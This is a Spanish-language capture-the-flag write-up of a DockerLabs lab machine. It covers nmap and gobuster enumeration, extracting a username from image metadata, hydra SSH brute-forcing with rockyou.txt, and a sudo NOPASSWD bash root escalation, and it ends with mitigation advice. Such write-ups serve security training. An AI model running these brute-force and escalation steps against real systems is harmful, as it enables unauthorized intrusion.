# 🚩 CTF Writeup: BorazuwarahCTF

## 📊 Resumen 
* **Plataforma:** DockerLabs
* **Sistema Operativo:** Linux (Debian)
* **Dificultad:** Muy Fácil
* **Vector de Acceso:** Exposición de información en metadatos + Fuerza Bruta SSH.
* **Vector de Escalada:** Mala configuración de privilegios `sudo` (Abuso de `/bin/bash`).
* **Servicios Expuestos:** SSH (22), HTTP (80).

---

## 🔍 1. Escaneo Inicial
Lanzamos un escaneo general con nmap.

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

*<img width="574" height="59" alt="Pasted image 20260215222128" src="https://github.com/user-attachments/assets/c79378a9-f559-4bf8-a314-8bb419acff08" />
*

Encontramos 2 servicios funcionado, con sus respectivos puertos abiertos.

*<img width="937" height="248" alt="Pasted image 20260215222226" src="https://github.com/user-attachments/assets/f426b59c-f69b-429f-96bc-806e66bc0e25" />
*

## 🕵️ 2. Escaneo de vulnerabilidades específicas
Utilizamos un escaneo con nmap dirigido a los puertos/servicios encontrados.

```bash
sudo nmap -p22 --script=vuln 172.17.0.2
sudo nmap -p80 --script=vuln 172.17.0.2
```

*<img width="561" height="431" alt="Pasted image 20260215222948" src="https://github.com/user-attachments/assets/45a06cad-18c8-4110-b0dc-d78f6abb87d8" />
*

No se encuentra alguna posibilidad de intrusión con los anteriores escaneos. 

## 🌐 3. Enumeración Web
Se continua investigando indicios de vulnerabilidades accediendo al sitio web.

```text
http://172.17.0.2/
```

*<img width="764" height="679" alt="Pasted image 20260215224811" src="https://github.com/user-attachments/assets/709498f3-305d-462e-a44e-f284f89b2712" />
*

Al acceder con la dirección IP de la página desde la web nos encontramos con una imagen. Revisamos el código de la página para encontrar más información.       

```bash
curl http://172.17.0.2
```

*<img width="435" height="68" alt="Pasted image 20260215231226" src="https://github.com/user-attachments/assets/62273421-e51e-4c11-a44d-8e30297523f8" />
*

Nos devuelve un HTML con una imagen en su interior. Probamos con gobuster a ver qué directorios almacena la web.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

*<img width="662" height="413" alt="Pasted image 20260215232530" src="https://github.com/user-attachments/assets/66c7f0e8-0c8d-4862-8a20-5f2a616c5fa2" />
*

Nos muestra que solo tenemos acceso a la misma página de antes, nos enfocaremos en la única pista hasta el momento.

## 🖼️ 4. Análisis Forense (Esteganografía y Metadatos)
Descargamos y analizamos la imagen encontrada en el HTML.

```bash
wget http://172.17.0.2/imagen.jpeg
```

Utilizamos herramientas de reconocimiento sobre el archivo descargado.

```bash
# Confirmamos qué tipo de archivo es.
file imagen.jpeg
# Revisamos sus metadatos
exiftool imagen.jpeg
# Revisamos si hay algún archivo o script oculto dentro de la imagen
steghide info imagen.jpeg
```

* Con el primer comando, hemos validado que se trata de una imagen.
* Con el segundo comando, hemos encontrado en su descripción un usuario:

*<img width="615" height="462" alt="Pasted image 20260215234302" src="https://github.com/user-attachments/assets/2179267d-3392-4480-92db-6d06d9105705" />
*

* Con el tercer comando, hemos encontrado que en el interior de la imagen hay un archivo txt oculto.

*<img width="454" height="192" alt="Pasted image 20260215234757" src="https://github.com/user-attachments/assets/038edc06-d009-4d0d-8a22-fd7ee5cce3ea" />
*

Ahora con ese nombre de usuario y ese archivo txt vamos a empezar a probar qué encontramos. Utilizamos los siguientes comandos para extraer y mirar el contenido del archivo txt.

```bash
steghide extract -sf imagen.jpeg
cat secreto.txt
```

*<img width="385" height="182" alt="Pasted image 20260215235506" src="https://github.com/user-attachments/assets/a963e571-3c71-4fe9-af62-e08ccdcca688" />
*

Observamos que por el lado del txt no obtuvimos más información.

## 💥 5. Explotación (Fuerza Bruta SSH)
Encontramos un usuario de la investigación anterior, y el puerto 22 de SSH abierto, probaremos un ataque de fuerza bruta con hydra.

```bash
# Probamos con el usuario root sin éxito... 
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4

# Ahora sí probamos con el usuario obtenido de los metadatos de la imagen.
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

Vemos que nos encuentra la contraseña de ese usuario. 

*<img width="944" height="189" alt="Pasted image 20260216002008" src="https://github.com/user-attachments/assets/78a0ce92-f29d-48ce-9e93-624707cf27cb" />
*

## 👑 6. Escalada de Privilegios
Una vez ingresemos por SSH al usuario que ya habíamos encontrado anteriormente debemos de realizar otra investigación a ver si nos hacemos con el premio grande.

```bash
# Comando de acceso por ssh
ssh borazuwarah@172.17.0.2
```

Usamos `sudo -l` para ver qué permisos tiene nuestro usuario actual.

*<img width="938" height="118" alt="Pasted image 20260216002932" src="https://github.com/user-attachments/assets/fad76f85-df8a-4d33-a079-40898c26d5fb" />
*

Encontramos que este usuario puede ejecutar una bash sin que le pidan contraseña. Ejecutamos una bash y vemos la magia: 

*<img width="389" height="82" alt="Pasted image 20260216003354" src="https://github.com/user-attachments/assets/8b8ce2f9-5a30-417d-ae9e-269980185450" />
*

---

## 🏁 Conclusión del Ejercicio
La máquina fue comprometida encadenando tres fallos críticos de seguridad:
1. **Fuga de Información:** El desarrollador dejó el nombre de usuario (`borazuwarah`) expuesto en los metadatos de una imagen pública en el servidor web.
2. **Políticas de Contraseñas Débiles:** El usuario utilizaba una contraseña predecible (`123456`) susceptible a ataques de diccionario.
3. **Principio de Menor Privilegio Violado:** El usuario tenía permisos en el archivo `sudoers` para ejecutar una terminal de comandos (`/bin/bash`) como administrador sin necesidad de autenticación.

## 🛡️ Recomendaciones y Mitigaciones (Blue Team)
* **Sanitización Web:** Implementar rutinas automáticas para limpiar metadatos (EXIF) de todos los recursos multimedia antes de subirlos a producción.
* **Bastionado SSH:** Deshabilitar la autenticación por contraseña en SSH y exigir el uso de llaves criptográficas (Public Key Authentication). Alternativamente, implementar herramientas como `Fail2Ban` para bloquear ataques de fuerza bruta.
* **Auditoría de Sudoers:** Revocar inmediatamente el permiso `NOPASSWD` para `/bin/bash` del usuario `borazuwarah`. Auditar el archivo `/etc/sudoers` para asegurar que solo los administradores estrictamente necesarios tengan privilegios de ejecución.
